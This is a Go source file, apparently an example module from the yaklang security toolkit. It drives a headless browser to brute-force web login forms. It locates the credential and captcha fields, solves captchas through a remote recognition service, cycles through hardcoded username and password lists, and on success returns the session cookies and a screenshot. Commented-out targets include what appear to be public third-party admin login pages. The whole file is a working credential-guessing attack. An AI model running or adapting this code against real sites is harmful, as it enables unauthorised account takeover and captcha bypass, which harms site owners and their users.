package examples

import (
	"fmt"
	"github.com/go-rod/rod/lib/proto"
	"yaklang.io/yaklang/common/log"
	"yaklang.io/yaklang/common/simulator/core"
	"yaklang.io/yaklang/common/simulator/extend"
	"yaklang.io/yaklang/common/utils"
)

func BruteForce(urlStr string) {
	if urlStr == "" {
		urlStr = "http://192.168.0.80/member.php?c=login"
		//urlStr = "http://vip.hzxy999.com/admin/login/login.html"
		//urlStr = "http://121.42.174.241:8087/login"
		//urlStr = "http://192.168.0.68:18000/#/login"
	}
	log.Infof("### bruteforce example ###")
	log.Infof("### target url: %s", urlStr)
	pack := core.PageCreator()
	pack.SetURL(urlStr)
	page := pack.Create()

	log.Info("### Page Load End. Start Scan ###")
	originHtml := page.HTML()
	elements, _ := page.FindElements("input")
	elements = elements.FilteredTypeElement("text", "password", "number", "tel")
	if elements.Empty() {
		log.Infof("none input found")
		return
	}
	// username
	userelements := elements.FilteredKeywordElements("username")
	var userelement *core.GeneralElement
	if userelements.Single() {
		userelement = userelements.First()
	} else if userelements.Multi() {
		userelement = userelements.FilteredKeywordElement("username")
	} else {
		log.Infof("username element not found")
		return
	}
	elements = elements.Slice(userelement)
	// password
	passelements := elements.FilteredKeywordElements("password")
	var passelement *core.GeneralElement
	if passelements.Single() {
		passelement = passelements.First()
	} else if passelements.Multi() {
		passelement = passelements.FilteredKeywordElement("password")
	} else {
		log.Infof("pass element not found")
		return
	}
	elements = elements.Slice(passelement)
	// captcha
	captchaelements := elements.FilteredKeywordElements("captcha")
	var captchaelement *core.GeneralElement
	if captchaelements.Single() {
		captchaelement = captchaelements.First()
	} else if captchaelements.Multi() {
		captchaelement = captchaelements.FilteredKeywordElement("captcha")
	}
	capmodule := extend.CreateCaptcha()
	var captchaimgelement *core.GeneralElement
	if captchaelement != nil {
		//capmodule.SetIdentifyUrl("http://101.35.184.3:19199/runtime/text/invoke")
		capmodule.SetIdentifyUrl("http://192.168.0.68:8008/runtime/text/invoke")
		capmodule.SetRequestStruct(&extend.CaptchaRequest{})
		capmodule.SetResponseStruct(&extend.CaptchaResult{})
		captchaimgelements, _ := captchaelement.GeneralGetLatestElements("img", 5)
		if captchaimgelements.Length() == 0 {
			log.Infof("captcha %s exist but captcha img not exist", captchaelement)
			return
		} else if captchaimgelements.Length() == 1 {
			captchaimgelement = captchaimgelements.First()
		} else {
			captchaimgelement = captchaimgelements.FilteredKeywordElement("captcha")
		}
	}

	var button *core.GeneralElement
	buttons, _ := page.GeneralFindElements("button")
	buttons = buttons.Slice(userelement)
	buttons = buttons.Slice(passelement)
	if buttons.Single() {
		button = buttons.First()
	} else if buttons.Multi() {
		button = buttons.FilteredKeywordElement("login")
	} else {
		log.Infof("button element not found")
		return
	}
	fmt.Println(userelement, passelement, captchaelement, captchaimgelement, button)

	go page.OriginPage().EachEvent(
		func(e *proto.PageJavascriptDialogOpening) {
			_ = proto.PageHandleJavaScriptDialog{Accept: false, PromptText: ""}.Call(page.OriginPage())
		},
	)()

	username := []string{"admin"}
	password := []string{"123321", "luckyadmin123"}
	for _, u := range username {
		for _, p := range password {
			fmt.Println(u, ":", p)
			userelement.Input(u)
			passelement.Input(p)
			if captchaelement != nil {
				capStr, err := capmodule.Detect(captchaimgelement)
				if err != nil {
					log.Info(err)
					return
				} else {
					log.Info(capStr)
				}
				captchaelement.Input(capStr)
			}
			page.Screenshot("1.png")
			err := page.StartListen()
			if err != nil {
				log.Info("start listen err: %s", err)
			}
			err = button.Click()
			if err != nil {
				log.Infof("login button click error: %s", err)
				return
			}
			page.Wait()
			currentHtml := page.HTML()
			degree := extend.GetPageSimilarity(originHtml, currentHtml)
			log.Info(degree)
			//break
			words, _ := page.StopListenWithBytes()
			if len(words) > 500 {
				words = words[:500]
				words = append(words, 46, 46, 46)
			}
			page.Screenshot("test.png")
			fmt.Printf("page element change info: \n%s\n", string(words))
			if page.CurrentURL() != page.Url() {
				fmt.Printf("login success! with username: %s & passwprd: %s", u, p)
				return
			}
		}
	}
}

func BruteForceModuleV2(urlStr string, configOpts ...ConfigOpt) (*BruteForceResult, error) {
	log.Infof("### bruteforce example ###")
	log.Infof("### load config ###")
	config := &Config{
		usernameList: make([]string, 0),
		passwordList: make([]string, 0),
	}
	for _, configOpt := range configOpts {
		configOpt(config)
	}
	log.Infof("### target url: %s ###", urlStr)

	pack := core.PageCreator()
	pack.SetURL(urlStr)
	if config.wsAddress != "" {
		pack.SetWsAddress(config.wsAddress)
	}
	if config.proxy != "" {
		pack.SetProxy(config.proxy, config.proxyUser, config.proxyPass)
	}
	page := pack.Create()

	result := &BruteForceResult{}

	userElement, passElement, captchaElement, capPicElement, loginElement, err := pageInfoCollection(page)
	if err != nil {
		return result, utils.Errorf("page info collection error: %s", err)
	}

	capModule := extend.CreateCaptcha()
	if config.captchaUrl == "" {
		capModule.SetIdentifyUrl("http://192.168.0.58:8008/runtime/text/invoke")
	} else {
		capModule.SetIdentifyUrl(config.captchaUrl)
	}
	capModule.SetRequestStruct(&extend.CaptchaRequest{})
	capModule.SetResponseStruct(&extend.CaptchaResult{})
	if config.captchaMode != "" {
		capModule.SetIdentifyMode(config.captchaMode)
	}

	originHtml := page.HTML()

	go page.OriginPage().EachEvent(
		func(e *proto.PageJavascriptDialogOpening) {
			_ = proto.PageHandleJavaScriptDialog{Accept: false, PromptText: ""}.Call(page.OriginPage())
		},
	)()

	if len(config.usernameList) == 0 {
		config.usernameList = append(config.usernameList, "admin")
	}
	if len(config.passwordList) == 0 {
		config.passwordList = append(config.passwordList, "admin", "luckyadmin123")
	}

	for _, username := range config.usernameList {
		for _, password := range config.passwordList {
			b64, err := inputClickTry(
				page,
				userElement, passElement, captchaElement, capPicElement, loginElement,
				capModule,
				originHtml, username, password,
			)
			if err == nil {
				cookies := page.OriginPage().MustCookies()
				cookieStr := ""
				for _, cookie := range cookies {
					name := cookie.Name
					value := cookie.Value
					cookieStr += name + "=" + value + "; "
				}
				if cookieStr != "" {
					cookieStr = cookieStr[:len(cookieStr)-2]
				}

				result.SetLoginPngB64(b64)
				result.SetUsername(username)
				result.SetPassword(password)
				result.SetCookie(cookieStr)
				return result, nil
			}
			result.AddLog(err.Error())
			switch err.(type) {
			case *WrongUsernamePasswordError:
				continue
			case error:
				return result, err
			}
		}
	}
	return result, utils.Error("bruteforce failed.")
}

func BruteForceModule(urlStr string, usernameList, passwordList []string, captchaUrl ...string) (string, string, string) {
	log.Infof("### bruteforce example ###")
	log.Infof("### target url: %s", urlStr)
	pack := core.PageCreator()
	pack.SetURL(urlStr)
	page := pack.Create()
	userElement, passElement, captchaElement, capPicElement, loginElement, err := pageInfoCollection(page)
	if err != nil {
		log.Infof("page info collection error: %s", err)
	}

	capModule := extend.CreateCaptcha()
	if len(captchaUrl) == 0 {
		capModule.SetIdentifyUrl("http://192.168.0.68:8008/runtime/text/invoke")
	} else {
		capModule.SetIdentifyUrl(captchaUrl[0])
	}
	capModule.SetRequestStruct(&extend.CaptchaRequest{})
	capModule.SetResponseStruct(&extend.CaptchaResult{})
	capModule.SetIdentifyMode("common_alphanumeric")

	originHtml := page.HTML()

	go page.OriginPage().EachEvent(
		func(e *proto.PageJavascriptDialogOpening) {
			_ = proto.PageHandleJavaScriptDialog{Accept: false, PromptText: ""}.Call(page.OriginPage())
		},
	)()

	for _, username := range usernameList {
		for _, password := range passwordList {
			b64, err := inputClickTry(
				page,
				userElement, passElement, captchaElement, capPicElement, loginElement,
				capModule,
				originHtml, username, password,
			)
			//switch err.(type) {
			//case *WrongUsernamePasswordError:
			//	continue
			//case error:
			//	return "", "", ""
			//}
			if err == nil {
				//log.Info("end!")
				//log.Info(b64)
				return username, password, b64
			}
		}
	}
	return "", "", ""
}

func pageInfoCollection(page *core.GeneralPage) (
	*core.GeneralElement,
	*core.GeneralElement,
	*core.GeneralElement,
	*core.GeneralElement,
	*core.GeneralElement,
	error) {
	log.Info("### Page Load End. Start Scan ###")
	elements, _ := page.FindElements("input")
	elements = elements.FilteredTypeElement("text", "password", "number", "tel")
	if elements.Empty() {
		return nil, nil, nil, nil, nil, utils.Errorf("none input found from page.")
	}
	// username
	userelements := elements.FilteredKeywordElements("username")
	var userelement *core.GeneralElement
	if userelements.Single() {
		userelement = userelements.First()
	} else if userelements.Multi() {
		userelement = userelements.FilteredKeywordElement("username")
	} else {
		return nil, nil, nil, nil, nil, utils.Errorf("username element not found.")
	}
	elements = elements.Slice(userelement)
	// password
	passelements := elements.FilteredKeywordElements("password")
	var passelement *core.GeneralElement
	if passelements.Single() {
		passelement = passelements.First()
	} else if passelements.Multi() {
		passelement = passelements.FilteredKeywordElement("password")
	} else {
		return nil, nil, nil, nil, nil, utils.Errorf("password element not found.")
	}
	elements = elements.Slice(passelement)
	// captcha
	captchaelements := elements.FilteredKeywordElements("captcha")
	var captchaelement *core.GeneralElement
	if captchaelements.Single() {
		captchaelement = captchaelements.First()
	} else if captchaelements.Multi() {
		captchaelement = captchaelements.FilteredKeywordElement("captcha")
	}
	capmodule := extend.CreateCaptcha()
	var captchaimgelement *core.GeneralElement
	if captchaelement != nil {
		//capmodule.SetIdentifyUrl("http://101.35.184.3:19199/runtime/text/invoke")
		capmodule.SetIdentifyUrl("http://192.168.0.68:8008/runtime/text/invoke")
		capmodule.SetRequestStruct(&extend.CaptchaRequest{})
		capmodule.SetResponseStruct(&extend.CaptchaResult{})
		captchaimgelements, _ := captchaelement.GeneralGetLatestElements("img", 5)
		if captchaimgelements.Length() == 0 {
			return nil, nil, nil, nil, nil, utils.Errorf("captcha %s exist but captcha img not exist", captchaelement)
		} else if captchaimgelements.Length() == 1 {
			captchaimgelement = captchaimgelements.First()
		} else {
			captchaimgelement = captchaimgelements.FilteredKeywordElement("captcha")
		}
	}

	var button *core.GeneralElement
	buttons, _ := page.GeneralFindElements("button")
	buttons = buttons.Slice(userelement)
	buttons = buttons.Slice(passelement)
	if buttons.Single() {
		button = buttons.First()
	} else if buttons.Multi() {
		button = buttons.FilteredKeywordElement("login")
	} else {
		return nil, nil, nil, nil, nil, utils.Errorf("button element not found.")
	}
	log.Info("detect element: \nusername element: ", userelement,
		"\npassword element: ", passelement,
		"\ncaptcha element: ", captchaelement,
		"\ncaptcha image element: ", captchaimgelement,
		"\nlogin button element: ", button)
	return userelement, passelement, captchaelement, captchaimgelement, button, nil
}

func inputClickTry(
	page *core.GeneralPage,
	userElement, passElement, captchaElement, capPicElement, loginElement *core.GeneralElement,
	capModule *extend.CaptchaIdentifier,
	originHtml, username, password string) (string, error) {
	log.Info("current account: ", username, ":", password)
	userElement.Input(username)
	passElement.Input(password)
	if captchaElement != nil {
		capStr, err := capModule.Detect(capPicElement)
		if err != nil {
			log.Info(err)
			return "", err
		} else {
			//log.Info(capStr)
		}
		captchaElement.Input(capStr)
	}
	//page.Screenshot("1.png")
	err := page.StartListen()
	if err != nil {
		log.Info("start listen err: %s", err)
	}
	err = loginElement.Click()
	if err != nil {
		log.Infof("login button click error: %s", err)
		return "", utils.Errorf("login button click error: %s", err)
	}
	page.Wait()
	//break
	words, err := page.StopListenWithBytes()
	if err != nil {
		log.Infof("get listen word error: %s", err)
	}
	if len(words) > 500 {
		words = words[:500]
		words = append(words, 46, 46, 46)
	}
	//page.Screenshot("test.png")
	currentHtml := page.HTML()
	degree := extend.GetPageSimilarity(originHtml, currentHtml)
	log.Info("current page similarity degree: ", degree)
	log.Infof("page element change info: \n%s\n", string(words))
	if degree < 0.6 {
		log.Infof("login success! with username: %s & passwprd: %s", username, password)
		pageB64, _ := page.ScreenShotResult()
		return pageB64, nil
	} else if degree > 0.8 {
		errInfo := fmt.Sprintf("login failed with %s:%s", username, password)
		if string(words) != "" {
			errInfo += "; page change info: " + string(words)
		}
		return "", NewWrongUsernamePasswordErrorf(errInfo)
	} else {
		if page.CurrentURL() != page.Url() {
			log.Infof("login success! with username: %s & passwprd: %s", username, password)
			pageB64, _ := page.ScreenShotResult()
			return pageB64, nil
		}
	}
	errInfo := fmt.Sprintf("login failed with %s:%s", username, password)
	if string(words) != "" {
		errInfo += "; page change info: " + string(words)
	}
	return "", NewWrongUsernamePasswordErrorf(errInfo)
}
